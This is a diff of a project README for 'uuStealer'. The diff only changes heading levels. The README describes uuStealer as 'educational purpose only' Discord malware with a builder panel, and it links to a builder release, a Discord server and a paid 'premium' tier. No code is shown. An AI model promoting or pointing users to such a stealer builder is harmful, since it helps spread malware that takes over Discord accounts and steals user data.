@@ -1,8 +1,8 @@
 ### [🔗 Discord Link](https://discord.gg/Sh236kfpvK) - [🔨 Builder](https://github.com/g2uu/uuStealer/releases/tag/Builder) - [💎 Premium](https://discord.gg/Sh236kfpvK) - 
-### uuStealer
+## uuStealer
 Official repos
 
-### What is uuStealer ? 
+## What is uuStealer ? 
 uuStealer is an educational purpose only open-source Discord Malware. With an easy to build panel and a "premium" feature (Join Discord for more infos) 
 
 
